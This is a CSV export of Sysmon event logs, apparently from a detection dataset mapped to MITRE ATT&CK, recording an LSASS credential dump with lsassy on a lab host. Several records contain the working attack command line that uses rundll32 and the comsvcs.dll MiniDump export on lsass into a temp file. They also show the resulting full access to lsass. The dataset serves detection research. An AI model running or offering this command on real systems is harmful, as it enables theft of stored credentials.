RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,ProcessId,ThreadId,Computer,ChunkNumber,UserId,MapDescription,UserName,RemoteHost,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,HiddenRecord,SourceFile,Keywords,ExtraDataOffset,Payload
1,71666,2021-10-20 14:18:43.3263800,18,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1152,1764,FS03.offsec.lan,0,S-1-5-18,PipeEvent (Pipe Connected),,,"ProcessID: 1640, ProcessGUID: 7cf65fc7-665f-6165-2000-000000001200",PipeName: \srvsvc,,,Image: C:\Windows\system32\wbem\wmiprvse.exe,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID1-LSASS dump with LSASSY (SYSMON).evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""technique_id=T1049,technique_name=System Network Connections Discovery""},{""@Name"":""EventType"",""#text"":""ConnectPipe""},{""@Name"":""UtcTime"",""#text"":""2021-10-20 14:18:43.326""},{""@Name"":""ProcessGuid"",""#text"":""7cf65fc7-665f-6165-2000-000000001200""},{""@Name"":""ProcessId"",""#text"":""1640""},{""@Name"":""PipeName"",""#text"":""\\srvsvc""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\wbem\\wmiprvse.exe""}]}}"
2,71667,2021-10-20 14:18:43.3263800,18,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1152,1764,FS03.offsec.lan,0,S-1-5-18,PipeEvent (Pipe Connected),,,"ProcessID: 1640, ProcessGUID: 7cf65fc7-665f-6165-2000-000000001200",PipeName: \srvsvc,,,Image: C:\Windows\system32\wbem\wmiprvse.exe,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID1-LSASS dump with LSASSY (SYSMON).evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""technique_id=T1049,technique_name=System Network Connections Discovery""},{""@Name"":""EventType"",""#text"":""ConnectPipe""},{""@Name"":""UtcTime"",""#text"":""2021-10-20 14:18:43.326""},{""@Name"":""ProcessGuid"",""#text"":""7cf65fc7-665f-6165-2000-000000001200""},{""@Name"":""ProcessId"",""#text"":""1640""},{""@Name"":""PipeName"",""#text"":""\\srvsvc""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\wbem\\wmiprvse.exe""}]}}"
3,71668,2021-10-20 14:18:55.8085877,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1152,1764,FS03.offsec.lan,0,S-1-5-18,Process creation,OFFSEC\admmig,,"ProcessID: 2508, ProcessGUID: 7cf65fc7-254f-6170-9402-000000001200","RuleName: technique_id=T1086,technique_name=PowerShell","SHA1=9F1E24917EF96BBB339F4E2A226ACAFD1009F47B,MD5=C031E215B8B08C752BF362F6D4C5D3AD,SHA256=840E1F9DC5A29BEBF01626822D7390251E9CF05BB3560BA7B68BDB8A41CF08E3,IMPHASH=099B747A4A31983374E54912D4BB7C44",ParentProcess: C:\Windows\System32\wbem\WmiPrvSE.exe,"ParentProcessID: 1640, ParentProcessGUID: 7cf65fc7-665f-6165-2000-000000001200",ParentCommandLine: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding,"powershell.exe -NoP -C ""C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\76nivOxA.dmp full;Wait-Process -Id (Get-Process rundll32).id""",False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID1-LSASS dump with LSASSY (SYSMON).evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""technique_id=T1086,technique_name=PowerShell""},{""@Name"":""UtcTime"",""#text"":""2021-10-20 14:18:55.808""},{""@Name"":""ProcessGuid"",""#text"":""7cf65fc7-254f-6170-9402-000000001200""},{""@Name"":""ProcessId"",""#text"":""2508""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""},{""@Name"":""FileVersion"",""#text"":""6.3.9600.17415 (winblue_r4.141028-1500)""},{""@Name"":""Description"",""#text"":""Windows PowerShell""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""PowerShell.EXE""},{""@Name"":""CommandLine"",""#text"":""powershell.exe -NoP -C \""C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\76nivOxA.dmp full;Wait-Process -Id (Get-Process rundll32).id\""""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\""},{""@Name"":""User"",""#text"":""OFFSEC\\admmig""},{""@Name"":""LogonGuid"",""#text"":""7cf65fc7-254f-6170-c8ee-690200000000""},{""@Name"":""LogonId"",""#text"":""0x269EEC8""},{""@Name"":""TerminalSessionId"",""#text"":""0""},{""@Name"":""IntegrityLevel"",""#text"":""High""},{""@Name"":""Hashes"",""#text"":""SHA1=9F1E24917EF96BBB339F4E2A226ACAFD1009F47B,MD5=C031E215B8B08C752BF362F6D4C5D3AD,SHA256=840E1F9DC5A29BEBF01626822D7390251E9CF05BB3560BA7B68BDB8A41CF08E3,IMPHASH=099B747A4A31983374E54912D4BB7C44""},{""@Name"":""ParentProcessGuid"",""#text"":""7cf65fc7-665f-6165-2000-000000001200""},{""@Name"":""ParentProcessId"",""#text"":""1640""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\wbem\\WmiPrvSE.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding""}]}}"
4,71669,2021-10-20 14:18:55.8554570,18,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1152,1764,FS03.offsec.lan,0,S-1-5-18,PipeEvent (Pipe Connected),,,"ProcessID: 2508, ProcessGUID: 7cf65fc7-254f-6170-9402-000000001200",PipeName: \srvsvc,,,Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID1-LSASS dump with LSASSY (SYSMON).evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""technique_id=T1049,technique_name=System Network Connections Discovery""},{""@Name"":""EventType"",""#text"":""ConnectPipe""},{""@Name"":""UtcTime"",""#text"":""2021-10-20 14:18:55.855""},{""@Name"":""ProcessGuid"",""#text"":""7cf65fc7-254f-6170-9402-000000001200""},{""@Name"":""ProcessId"",""#text"":""2508""},{""@Name"":""PipeName"",""#text"":""\\srvsvc""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""}]}}"
5,71670,2021-10-20 14:18:55.8710796,7,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1152,1764,FS03.offsec.lan,0,S-1-5-18,Image loaded,,,"ProcessID: 2508, ProcessGUID: 7cf65fc7-254f-6170-9402-000000001200","RuleName: technique_id=T1086,technique_name=PowerShell","SHA1=BFDFC46117000B652897F1DE8084FBB9EAA66384,MD5=6EF679145F15A8E54FBF9B23A25A6F21,SHA256=240674945FF5175A14E5DF6DEB2AECD04231911DE9103CA34F6D327C4FF86732,IMPHASH=00000000000000000000000000000000",Signed: false,Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\3e50931f5376ebab490b124f3f46dd45\System.Management.Automation.ni.dll,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID1-LSASS dump with LSASSY (SYSMON).evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""technique_id=T1086,technique_name=PowerShell""},{""@Name"":""UtcTime"",""#text"":""2021-10-20 14:18:55.871""},{""@Name"":""ProcessGuid"",""#text"":""7cf65fc7-254f-6170-9402-000000001200""},{""@Name"":""ProcessId"",""#text"":""2508""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""},{""@Name"":""ImageLoaded"",""#text"":""C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\3e50931f5376ebab490b124f3f46dd45\\System.Management.Automation.ni.dll""},{""@Name"":""FileVersion"",""#text"":""6.3.9600.19170""},{""@Name"":""Description"",""#text"":""System.Management.Automation""},{""@Name"":""Product"",""#text"":""Microsoft (R) Windows (R) Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""System.Management.Automation.dll""},{""@Name"":""Hashes"",""#text"":""SHA1=BFDFC46117000B652897F1DE8084FBB9EAA66384,MD5=6EF679145F15A8E54FBF9B23A25A6F21,SHA256=240674945FF5175A14E5DF6DEB2AECD04231911DE9103CA34F6D327C4FF86732,IMPHASH=00000000000000000000000000000000""},{""@Name"":""Signed"",""#text"":""false""},{""@Name"":""Signature"",""#text"":""-""},{""@Name"":""SignatureStatus"",""#text"":""Unavailable""}]}}"
6,71671,2021-10-20 14:18:56.0898390,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1152,1764,FS03.offsec.lan,0,S-1-5-18,Process creation,OFFSEC\admmig,,"ProcessID: 2860, ProcessGUID: 7cf65fc7-2550-6170-9602-000000001200","RuleName: technique_id=T1086,technique_name=PowerShell","SHA1=D4AC232D507769FFD004439C15302916A40D9831,MD5=6C308D32AFA41D26CE2A0EA8F7B79565,SHA256=5CC2C563D89257964C4B446F54AFE1E57BBEE49315A9FC001FF5A6BCB6650393,IMPHASH=156B2AC675B1B9202AF35C643105610C",ParentProcess: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"ParentProcessID: 2508, ParentProcessGUID: 7cf65fc7-254f-6170-9402-000000001200","ParentCommandLine: powershell.exe -NoP -C ""C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\76nivOxA.dmp full;Wait-Process -Id (Get-Process rundll32).id""","""C:\Windows\System32\rundll32.exe""  C:\Windows\System32\comsvcs.dll MiniDump 512 \Windows\Temp\76nivOxA.dmp full",False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID1-LSASS dump with LSASSY (SYSMON).evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""technique_id=T1086,technique_name=PowerShell""},{""@Name"":""UtcTime"",""#text"":""2021-10-20 14:18:56.089""},{""@Name"":""ProcessGuid"",""#text"":""7cf65fc7-2550-6170-9602-000000001200""},{""@Name"":""ProcessId"",""#text"":""2860""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\rundll32.exe""},{""@Name"":""FileVersion"",""#text"":""6.3.9600.17415 (winblue_r4.141028-1500)""},{""@Name"":""Description"",""#text"":""Windows host process (Rundll32)""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""RUNDLL32.EXE""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Windows\\System32\\rundll32.exe\""  C:\\Windows\\System32\\comsvcs.dll MiniDump 512 \\Windows\\Temp\\76nivOxA.dmp full""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\""},{""@Name"":""User"",""#text"":""OFFSEC\\admmig""},{""@Name"":""LogonGuid"",""#text"":""7cf65fc7-254f-6170-c8ee-690200000000""},{""@Name"":""LogonId"",""#text"":""0x269EEC8""},{""@Name"":""TerminalSessionId"",""#text"":""0""},{""@Name"":""IntegrityLevel"",""#text"":""High""},{""@Name"":""Hashes"",""#text"":""SHA1=D4AC232D507769FFD004439C15302916A40D9831,MD5=6C308D32AFA41D26CE2A0EA8F7B79565,SHA256=5CC2C563D89257964C4B446F54AFE1E57BBEE49315A9FC001FF5A6BCB6650393,IMPHASH=156B2AC675B1B9202AF35C643105610C""},{""@Name"":""ParentProcessGuid"",""#text"":""7cf65fc7-254f-6170-9402-000000001200""},{""@Name"":""ParentProcessId"",""#text"":""2508""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""},{""@Name"":""ParentCommandLine"",""#text"":""powershell.exe -NoP -C \""C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\76nivOxA.dmp full;Wait-Process -Id (Get-Process rundll32).id\""""}]}}"
7,71672,2021-10-20 14:18:56.1054570,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1152,1764,FS03.offsec.lan,0,S-1-5-18,FileCreate,,,"ProcessID: 2860, ProcessGUID: 7cf65fc7-2550-6170-9602-000000001200",RuleName: -,Image: C:\Windows\System32\rundll32.exe,TargetFilename: C:\Windows\Temp\76nivOxA.dmp,,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID1-LSASS dump with LSASSY (SYSMON).evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2021-10-20 14:18:56.105""},{""@Name"":""ProcessGuid"",""#text"":""7cf65fc7-2550-6170-9602-000000001200""},{""@Name"":""ProcessId"",""#text"":""2860""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\rundll32.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Windows\\Temp\\76nivOxA.dmp""},{""@Name"":""CreationUtcTime"",""#text"":""2021-10-20 14:18:56.105""}]}}"
8,71673,2021-10-20 14:18:56.1054570,10,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1152,1764,FS03.offsec.lan,0,S-1-5-18,ProcessAccess,"SourceUser:  | TargetUser: ",,,GrantedAccess: Unknown code (0x1FFFFF),"SourceProcessID: 2860, SourceProcessGUID: ",SourceImage: C:\Windows\System32\rundll32.exe,"TargetProcessID: 512, TargetProcessGUID: ",TargetImage: C:\Windows\system32\lsass.exe,CallTrace: C:\Windows\SYSTEM32\ntdll.dll+909ba|C:\Windows\SYSTEM32\ntdll.dll+80498|C:\Windows\system32\KERNEL32.DLL+1c804|C:\Windows\system32\KERNEL32.DLL+1c247|C:\Windows\SYSTEM32\dbghelp.dll+1244d8|C:\Windows\SYSTEM32\dbghelp.dll+11ebd5|C:\Windows\SYSTEM32\dbghelp.dll+118402|C:\Windows\SYSTEM32\dbghelp.dll+1137e2|C:\Windows\SYSTEM32\dbghelp.dll+113c84|C:\Windows\System32\comsvcs.dll+3363a|C:\Windows\System32\rundll32.exe+2709|C:\Windows\System32\rundll32.exe+44c4|C:\Windows\system32\KERNEL32.DLL+13d2|C:\Windows\SYSTEM32\ntdll.dll+154f4,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID1-LSASS dump with LSASSY (SYSMON).evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2021-10-20 14:18:56.105""},{""@Name"":""SourceProcessGUID"",""#text"":""7cf65fc7-2550-6170-9602-000000001200""},{""@Name"":""SourceProcessId"",""#text"":""2860""},{""@Name"":""SourceThreadId"",""#text"":""544""},{""@Name"":""SourceImage"",""#text"":""C:\\Windows\\System32\\rundll32.exe""},{""@Name"":""TargetProcessGUID"",""#text"":""7cf65fc7-6649-6165-0b00-000000001200""},{""@Name"":""TargetProcessId"",""#text"":""512""},{""@Name"":""TargetImage"",""#text"":""C:\\Windows\\system32\\lsass.exe""},{""@Name"":""GrantedAccess"",""#text"":""0x1FFFFF""},{""@Name"":""CallTrace"",""#text"":""C:\\Windows\\SYSTEM32\\ntdll.dll+909ba|C:\\Windows\\SYSTEM32\\ntdll.dll+80498|C:\\Windows\\system32\\KERNEL32.DLL+1c804|C:\\Windows\\system32\\KERNEL32.DLL+1c247|C:\\Windows\\SYSTEM32\\dbghelp.dll+1244d8|C:\\Windows\\SYSTEM32\\dbghelp.dll+11ebd5|C:\\Windows\\SYSTEM32\\dbghelp.dll+118402|C:\\Windows\\SYSTEM32\\dbghelp.dll+1137e2|C:\\Windows\\SYSTEM32\\dbghelp.dll+113c84|C:\\Windows\\System32\\comsvcs.dll+3363a|C:\\Windows\\System32\\rundll32.exe+2709|C:\\Windows\\System32\\rundll32.exe+44c4|C:\\Windows\\system32\\KERNEL32.DLL+13d2|C:\\Windows\\SYSTEM32\\ntdll.dll+154f4""}]}}"
9,71674,2021-10-20 14:19:03.3342391,18,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1152,1764,FS03.offsec.lan,0,S-1-5-18,PipeEvent (Pipe Connected),,,"ProcessID: 1640, ProcessGUID: 7cf65fc7-665f-6165-2000-000000001200",PipeName: \srvsvc,,,Image: C:\Windows\system32\wbem\wmiprvse.exe,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID1-LSASS dump with LSASSY (SYSMON).evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""technique_id=T1049,technique_name=System Network Connections Discovery""},{""@Name"":""EventType"",""#text"":""ConnectPipe""},{""@Name"":""UtcTime"",""#text"":""2021-10-20 14:19:03.334""},{""@Name"":""ProcessGuid"",""#text"":""7cf65fc7-665f-6165-2000-000000001200""},{""@Name"":""ProcessId"",""#text"":""1640""},{""@Name"":""PipeName"",""#text"":""\\srvsvc""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\wbem\\wmiprvse.exe""}]}}"
10,71675,2021-10-20 14:19:03.3342391,18,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1152,1764,FS03.offsec.lan,0,S-1-5-18,PipeEvent (Pipe Connected),,,"ProcessID: 1640, ProcessGUID: 7cf65fc7-665f-6165-2000-000000001200",PipeName: \srvsvc,,,Image: C:\Windows\system32\wbem\wmiprvse.exe,,,False,EVTX-to-MITRE-Attack\TA0006-Credential Access\T1003-Credential dumping\ID1-LSASS dump with LSASSY (SYSMON).evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""technique_id=T1049,technique_name=System Network Connections Discovery""},{""@Name"":""EventType"",""#text"":""ConnectPipe""},{""@Name"":""UtcTime"",""#text"":""2021-10-20 14:19:03.334""},{""@Name"":""ProcessGuid"",""#text"":""7cf65fc7-665f-6165-2000-000000001200""},{""@Name"":""ProcessId"",""#text"":""1640""},{""@Name"":""PipeName"",""#text"":""\\srvsvc""},{""@Name"":""Image"",""#text"":""C:\\Windows\\system32\\wbem\\wmiprvse.exe""}]}}"
